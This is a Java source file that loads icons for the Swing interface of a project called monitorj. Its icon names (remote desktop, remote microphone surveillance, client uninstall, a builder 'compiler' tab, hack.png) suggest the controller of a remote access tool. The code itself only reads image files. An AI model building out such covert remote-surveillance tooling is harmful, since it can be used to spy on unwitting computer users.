package me.jershdervis.monitorj.util;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.IOException;

/**
 * Created by Josh on 20/06/2015.
 */
public class ResourceLoader {

    public static final String IMAGES_LOCATION = "me/jershdervis/monitorj/resources/images/";

    public static ImageIcon FORM_ICON;

    public static ImageIcon TAB_CLIENT_LIST;
    public static ImageIcon TAB_COMPILER;
    public static ImageIcon TAB_PLUGIN_CENTER;
    public static ImageIcon TAB_SOCKET_MANAGER;

    public static ImageIcon CLIENT_CONNECT;
    public static ImageIcon CLIENT_DISCONNECT;

    public static ImageIcon BUTTON_PLAY;
    public static ImageIcon BUTTON_PAUSE;
    public static ImageIcon BUTTON_SOCKET_ADD;
    public static ImageIcon BUTTON_SOCKET_REMOVE;

    public static ImageIcon CLIENT_CONNECTION_MENU;
    public static ImageIcon CLIENT_CONNECTION_RESTART;
    public static ImageIcon CLIENT_CONNECTION_DISCONNECT;
    public static ImageIcon CLIENT_CONNECTION_SHUTDOWN;
    public static ImageIcon CLIENT_CONNECTION_UNINSTALL;

    public static ImageIcon CLIENT_SYSTEM_MENU;
    public static ImageIcon CLIENT_SYSTEM_SLEEP;
    public static ImageIcon CLIENT_SYSTEM_LOGOFF;
    public static ImageIcon CLIENT_SYSTEM_RESTART;
    public static ImageIcon CLIENT_SYSTEM_SHUTDOWN;

    public static ImageIcon CLIENT_SURVEILLANCE_MENU;
    public static ImageIcon CLIENT_SURVEILLANCE_REMOTE_DESKTOP;
    public static ImageIcon CLIENT_SURVEILLANCE_REMOTE_MIC;

    public static ImageIcon CLIENT_TOOLS_MENU;
    public static ImageIcon CLIENT_TOOLS_REMOTE_CHAT;

    static {
        try {
            FORM_ICON = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "hack.png")));

            TAB_CLIENT_LIST = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "clientlist_tab.png")));
            TAB_COMPILER = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "compiler_tab.png")));
            TAB_PLUGIN_CENTER = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "plugincenter_tab.png")));
            TAB_SOCKET_MANAGER = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "socketmanager_tab.png")));

            CLIENT_CONNECT = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connect.png")));
            CLIENT_DISCONNECT = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "disconnect.png")));

            BUTTON_PLAY = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_play.png")));
            BUTTON_PAUSE = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_pause.png")));
            BUTTON_SOCKET_ADD = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_socket_add.png")));
            BUTTON_SOCKET_REMOVE = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "button_socket_remove.png")));

            //CONNECTION SUB-MENU ICONS
            CLIENT_CONNECTION_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection.png")));
            CLIENT_CONNECTION_RESTART = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection_restart.png")));
            CLIENT_CONNECTION_DISCONNECT = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection_disconnect.png")));
            CLIENT_CONNECTION_SHUTDOWN = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection_shutdown.png")));
            CLIENT_CONNECTION_UNINSTALL = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "connection_uninstall.png")));

            //SYSTEM SUB-MENU ICONS
            CLIENT_SYSTEM_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "system.png")));
            CLIENT_SYSTEM_SLEEP = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "system_sleep.png")));
            CLIENT_SYSTEM_LOGOFF = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "system_logoff.png")));
            CLIENT_SYSTEM_RESTART = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "system_restart.png")));
            CLIENT_SYSTEM_SHUTDOWN = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "system_shutdown.png")));

            //SURVEILLANCE SUB-MENU ICONS
            CLIENT_SURVEILLANCE_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "surveillance.png")));
            CLIENT_SURVEILLANCE_REMOTE_DESKTOP = new ImageIcon(ImageIO.read(ClassLoader.getSystemResourceAsStream(IMAGES_LOCATION + "surveillance_remotedesktop.png")));
            CLIENT_SURVEILLANCE_REMOTE_MIC = new ImageIcon(ImageIO.read(ClassLoader.getSystemResourceAsStream(IMAGES_LOCATION + "surveillance_remotemic.png")));

            //TOOLS SUB-MENU ICONS
            CLIENT_TOOLS_MENU = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "tools.png")));
            CLIENT_TOOLS_REMOTE_CHAT = new ImageIcon(ImageIO.read(ClassLoader.getSystemResource(IMAGES_LOCATION + "remotechat.png")));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
